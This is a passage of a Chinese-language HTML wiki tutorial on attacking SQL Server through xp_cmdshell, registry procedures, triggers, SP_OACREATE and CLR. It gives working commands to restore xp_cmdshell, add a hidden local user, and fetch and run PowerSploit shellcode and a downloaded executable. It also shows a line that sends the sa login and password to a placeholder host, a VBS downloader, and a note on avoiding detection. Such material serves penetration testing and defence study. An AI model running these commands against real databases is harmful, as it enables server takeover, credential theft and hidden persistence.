src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-7.png"></p><p>删除xp_cmdshell的语句:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec sp_dropextendedproc &#x27;xp_cmdshell&#x27;;</span><br></pre></td></tr></table></figure><p>删除xp_cmdshell过程，再添加xp_cmdshell过程，需要自行上传xplog70.dll恢复被删除的xp_cmdshell。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">drop procedure xp_cmdshell;</span><br><span class="line">exec sp_addextendedproc &quot;xp_cmdshell&quot;, &quot;xplog70.dll&quot;;</span><br></pre></td></tr></table></figure><p>附录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">exec sp_addextendedproc xp_cmdshell ,@dllname =&#x27;xplog70.dll&#x27;</span><br><span class="line">exec sp_addextendedproc xp_enumgroups ,@dllname =&#x27;xplog70.dll&#x27;</span><br><span class="line">exec sp_addextendedproc xp_loginconfig ,@dllname =&#x27;xplog70.dll&#x27;</span><br><span class="line">exec sp_addextendedproc xp_enumerrorlogs ,@dllname =&#x27;xpstar.dll&#x27;</span><br><span class="line">exec sp_addextendedproc xp_getfiledetails ,@dllname =&#x27;xpstar.dll&#x27;</span><br><span class="line">exec sp_addextendedproc Sp_OACreate ,@dllname =&#x27;odsole70.dll&#x27;</span><br><span class="line">exec sp_addextendedproc Sp_OADestroy ,@dllname =&#x27;odsole70.dll&#x27;</span><br><span class="line">exec sp_addextendedproc Sp_OAGetErrorInfo ,@dllname =&#x27;odsole70.dll&#x27;</span><br><span class="line">exec sp_addextendedproc Sp_OAGetProperty ,@dllname =&#x27;odsole70.dll&#x27;</span><br><span class="line">exec sp_addextendedproc Sp_OAMethod ,@dllname =&#x27;odsole70.dll&#x27;</span><br><span class="line">exec sp_addextendedproc Sp_OASetProperty ,@dllname =&#x27;odsole70.dll&#x27;</span><br><span class="line">exec sp_addextendedproc Sp_OAStop ,@dllname =&#x27;odsole70.dll&#x27;</span><br><span class="line">exec sp_addextendedproc xp_regaddmultistring ,@dllname =&#x27;xpstar.dll&#x27;</span><br><span class="line">exec sp_addextendedproc xp_regdeletekey ,@dllname =&#x27;xpstar.dll&#x27;</span><br><span class="line">exec sp_addextendedproc xp_regdeletevalue ,@dllname =&#x27;xpstar.dll&#x27;</span><br><span class="line">exec sp_addextendedproc xp_regenumvalues ,@dllname =&#x27;xpstar.dll&#x27;</span><br><span class="line">exec sp_addextendedproc xp_regremovemultistring ,@dllname =&#x27;xpstar.dll&#x27;</span><br><span class="line">exec sp_addextendedproc xp_regwrite ,@dllname =&#x27;xpstar.dll&#x27;</span><br><span class="line">exec sp_addextendedproc xp_dirtree ,@dllname =&#x27;xpstar.dll&#x27;</span><br><span class="line">exec sp_addextendedproc xp_regread ,@dllname =&#x27;xpstar.dll&#x27;</span><br><span class="line">exec sp_addextendedproc xp_fixeddrives ,@dllname =&#x27;xpstar.dll&#x27;</span><br></pre></td></tr></table></figure><p><strong>xp_cmdshell执行系统命令</strong></p><p><strong>xp_cmdshell执行whoami命令</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exec master.dbo.xp_cmdshell &#x27;whoami&#x27;</span><br><span class="line">exec master.dbo.xp_cmdshell &quot;whoami&quot;</span><br><span class="line">exec xp_cmdshell &quot;whoami&quot;;</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-15.png"></p><p><strong>xp_cmdshell执行ipconfig/all命令</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#x27;ipconfig/all&#x27;</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-9.png"></p><p><strong>查询操作系统和版本信息（分别对应中英文系统）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#x27;systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;&#x27;</span><br><span class="line">exec master..xp_cmdshell &#x27;systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;&#x27;</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-14.png"></p><p><strong>通过xp_cmdshell执行wmic 获取系统信息</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#x27;wmic cpu get name,NumberOfCores,NumberOfLogicalProcessors/Format:List&#x27;</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-13.png"></p><p><strong>调用reg query注册表键值判断RDP服务的端口号</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#x27;reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber&#x27;</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-8.png"></p><p><strong>通过xp_cmdshell执行添加testuser1用户并且不输出结果</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#x27;Net user testuser1 passwd1 /workstations:* /times:all /passwordchg:yes /passwordreq:yes /active:yes /add&#x27;,NO_OUTPUT</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-11.png"></p><p><strong>通过xp_cmdshell删除testuser1用户并且不输出结果</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC master..xp_cmdshell <span class="string">&#x27;net user testuser1/delete&#x27;</span>, NO_OUTPUT</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-10.png"></p><p>通过xp_cmdshell执行taskkill 杀死taskmgr.exe，taskmgr.exe用于任务管理器。它显示系统中正在运行的进程。该程序使用Ctrl+Alt+Del（一般是弹出Windows安全再点击“任务管理器”）或者Ctrl+Shift+Esc打开，这不是纯粹的系统程序，但是如果终止它，可能会导致不可知的问题。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master.dbo.xp_cmdshell <span class="string">&#x27;taskkill /f /im taskmgr.exe&#x27;</span>;</span><br></pre></td></tr></table></figure><p><strong>调用xp_cmdshell执行mkdir命令创建目录</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell <span class="string">&#x27;mkdir &quot;C:\test\&quot; &#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-12.png"></p><p><strong>通过xp_cmdshell执行dir命令</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell <span class="string">&#x27;dir c:\&#x27;</span></span><br><span class="line">exec xp_cmdshell <span class="string">&#x27;dir c:\&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-22.png"></p><p><strong>通过xp_cmdshell删除文件</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell <span class="string">&#x27;del C:\test&#x27;</span>;</span><br></pre></td></tr></table></figure><p><strong>xp_cmdshell调用Powershell</strong></p><p>通过xp_cmdshell调用powershell 下载<a href="http://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1">http://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec xp_cmdshell <span class="string">&#x27;powershell -c &quot;iex((new-object Net.WebClient).DownloadString(&#x27;</span><span class="string">&#x27;http://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1&#x27;</span><span class="string">&#x27;))&quot;&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-23.png"></p><p>调用xp_cmdshell执行echo CreateObject最后写入C:/ProgramData/vget.vbs文件</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell <span class="string">&#x27;echo Set x= CreateObject(^&quot;Microsoft.XMLHTTP^&quot;):x.Open ^&quot;GET^&quot;,LCase(WScript.Arguments(0)),0:x.Send():Set s = CreateObject(^&quot;ADODB.Stream^&quot;):s.Mode = 3:s.Type = 1:s.Open():s.Write(x.responseBody):s.SaveToFile LCase(WScript.Arguments(1)),2 &gt; C:/ProgramData/vget.vbs&#x27;</span>; </span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-24.png"></p><p>通过xp_cmdshell调用cmd.exe 执行powershell 调用OpenRead方法向数据库发送登录用户名sa密码</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec xp_cmdshell <span class="string">&#x27;powershell (new-object System.Net.WebClient).OpenRead(&#x27;</span><span class="string">&#x27;http://example/test.jsp?data=127.0.0.1%7c1433%7csa%7cDb123456&#x27;</span><span class="string">&#x27;)&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-25.png"></p><p>通过xp_cmdshell调用powershell下载test0.exe后并执行</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell <span class="string">&#x27;&quot;echo $client = New-Object System.Net.WebClient &gt; %TEMP%\test.ps1 &amp; echo $client.DownloadFile(&quot;http://example/test0.exe&quot;,&quot;%TEMP%\test.exe&quot;) &gt;&gt; %TEMP%\test.ps1 &amp; powershell  -ExecutionPolicy Bypass  %temp%\test.ps1 &amp; WMIC process call create &quot;%TEMP%\test.exe&quot;&quot;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="xp-regread"><a href="#xp-regread" class="headerlink" title="xp_regread"></a>xp_regread</h3><p>SQL Server存在一系列的存储过程，可以对注册表进行增删改查。xp_regread、xp_regwrite、xp_regdeletvalue、xp_regdeletkey、xp_regaddmultistring等。</p><p><strong>读注册表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec xp_regread &#x27;HKEY_current_user&#x27;,&#x27;Control Panel\International&#x27;,&#x27;sCountry&#x27;</span><br><span class="line">exec xp_regread N&#x27;HKEY_LOCAL_MACHINE&#x27;, N&#x27;SYSTEM\CurrentControlSet\Services\MSSEARCH&#x27;</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B-1.png"></p><p><strong>枚举可用的注册表键值</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec xp_regenumkeys &#x27;HKEY_CURRENT_USER&#x27;,&#x27;Control Panel\International&#x27;</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B-2.png"></p><h3 id="xp-fileexist"><a href="#xp-fileexist" class="headerlink" title="xp_fileexist"></a>xp_fileexist</h3><p>判读文件是否存在，第一列返回0表示文件不存在，返回1表示文件存在。当执行完无回显命令时，一般都将结果输入至文件中，利用此存储过程可以判断无回显命令是否执行成功。</p><p><strong>判读文件是否存在</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec xp_fileexist &#x27;C:\\test\test.txt&#x27;</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B-3.png"></p><p><strong>列出当前目录</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec xp_subdirs &quot;C:\\&quot;</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B-4.png"></p><h3 id="xp-getnetname"><a href="#xp-getnetname" class="headerlink" title="xp_getnetname"></a>xp_getnetname</h3><p><strong>获取服务器名称</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec xp_getnetname</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B-5.png"></p><h3 id="xp-msver"><a href="#xp-msver" class="headerlink" title="xp_msver"></a>xp_msver</h3><p><strong>获取服务器信息</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec xp_msver</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B-6.png"></p><h3 id="xp-fixeddrives"><a href="#xp-fixeddrives" class="headerlink" title="xp_fixeddrives"></a>xp_fixeddrives</h3><p><strong>获取磁盘空间信息</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec xp_fixeddrives</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B-7.png"></p><p>附常用的一些危险的存储过程，可自查存储过程的功能和用法。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">xp_cmdshell</span><br><span class="line">xp_dirtree</span><br><span class="line">xp_enumgroups</span><br><span class="line">xp_fixeddrives</span><br><span class="line">xp_loginconfig</span><br><span class="line">xp_enumerrorlogs</span><br><span class="line">xp_getfiledetails</span><br><span class="line">Sp_OACreate</span><br><span class="line">Sp_OADestroy</span><br><span class="line">Sp_OAGetErrorInfo</span><br><span class="line">Sp_OAGetProperty</span><br><span class="line">Sp_OAMethod</span><br><span class="line">Sp_OASetProperty</span><br><span class="line">Sp_OAStop</span><br><span class="line">Xp_regaddmultistring</span><br><span class="line">Xp_regdeletekey</span><br><span class="line">Xp_regdeletevalue</span><br><span class="line">Xp_regenumvalues</span><br><span class="line">Xp_regread</span><br><span class="line">Xp_regremovemultistring</span><br><span class="line">Xp_regwrite</span><br><span class="line">sp_makewebtask</span><br></pre></td></tr></table></figure><h2 id="SQL-Server-触发器"><a href="#SQL-Server-触发器" class="headerlink" title="SQL Server 触发器"></a>SQL Server 触发器</h2><p>SQL Server 触发器用于执行指定动作之后执行sql语句，比如配合update触发sql语句。</p><p>首先创建一个test表，插入字段值。</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/WarSQLKit-10.png"></p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/WarSQLKit-11.png"></p><p>创建一个名为test1的触发器，当test表执行update动作时，触发test1执行xp_cmdshell命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">set ANSI_NULLS on</span><br><span class="line">go</span><br><span class="line">set QUOTED_IDENTIFIER on</span><br><span class="line">go</span><br><span class="line">create trigger [test1]</span><br><span class="line">on [test]</span><br><span class="line">AFTER UPDATE as</span><br><span class="line">begin</span><br><span class="line">execute master..xp_cmdshell &#x27;cmd.exe /c calc.exe&#x27;</span><br><span class="line">end</span><br><span class="line">go</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/WarSQLKit-12.png"></p><p>执行下列更新test表操作，test1触发器触发。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE test SET name = &#x27;wangwu&#x27; WHERE LastName = &#x27;zhangsan&#x27;</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/WarSQLKit-13.png"></p><h2 id="SQL-Server-COM组件"><a href="#SQL-Server-COM组件" class="headerlink" title="SQL Server COM组件"></a>SQL Server COM组件</h2><p>SQL Server中的COM组件SP_OACREATE，执行系统命令，但是此利用方法无回显。</p><h3 id="SP-OACREATE"><a href="#SP-OACREATE" class="headerlink" title="SP_OACREATE"></a>SP_OACREATE</h3><p>查看SP_OACREATE状态。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from master.dbo.sysobjects where xtype=&#x27;x&#x27; and name=&#x27;SP_OACREATE&#x27;</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-26.png"></p><p>利用count(*)判断是否存在，，存在即返回1。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from master.dbo.sysobjects where xtype=&#x27;x&#x27; and name=&#x27;SP_OACREATE&#x27;</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-27.png"></p><h3 id="启用SP-OACREATE"><a href="#启用SP-OACREATE" class="headerlink" title="启用SP_OACREATE"></a>启用SP_OACREATE</h3><p>利用sp_configure存储过程，启用SP_OACREATE</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure &#x27;show advanced options&#x27;, 1; RECONFIGURE WITH OVERRIDE;   </span><br><span class="line">exec sp_configure &#x27;Ole Automation Procedures&#x27;, 1; RECONFIGURE WITH OVERRIDE;</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-28.png"></p><h3 id="利用SP-OACREATE执行命令"><a href="#利用SP-OACREATE执行命令" class="headerlink" title="利用SP_OACREATE执行命令"></a>利用SP_OACREATE执行命令</h3><p>利用SP_OACREATE执行系统命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;C:\Windows\System32\cmd.exe /c whoami /all &gt;C:\\test\test.txt&#x27;</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-29.png"></p><h2 id="SQL-Server-CLR相关利用"><a href="#SQL-Server-CLR相关利用" class="headerlink" title="SQL Server CLR相关利用"></a>SQL Server CLR相关利用</h2><p>CLR微软官方把他称为公共语言运行时，从 SQL Server 2005 (9.x) 开始，SQL Server 集成了用于 Microsoft Windows 的 .NET Framework 的公共语言运行时 (CLR) 组件。 这意味着现在可以使用任何 .NET Framework 语言（包括 Microsoft Visual Basic .NET 和 Microsoft Visual C#）来编写存储过程、触发器、用户定义类型、用户定义函数、用户定义聚合和流式表值函数。</p><p>官方链接：<a href="https://docs.microsoft.com/zh-cn/sql/relational-databases/clr-integration/common-language-runtime-clr-integration-programming-concepts?view=sql-server-ver15">https://docs.microsoft.com/zh-cn/sql/relational-databases/clr-integration/common-language-runtime-clr-integration-programming-concepts?view=sql-server-ver15</a></p><p>在利用MSSQL服务实现命令执行的时候，通常的做法是利用xp_cmdshell存储过程在MSSQL进程的上下文中运行操作系统命令。如果要想利用这种技术运行自定义代码，通常需要使用LOLBINS，添加新的操作系统用户，或通过BCP向磁盘中写入二进制文件，这些方法的缺点是很容易被发现。CLR方式可以利用16进制文件流方式导入DLL文件，这样不需要文件落地。</p><h3 id="创建CLR"><a href="#创建CLR" class="headerlink" title="创建CLR"></a>创建CLR</h3><p>利用VS创建MSSQL数据库项目</p><p><img 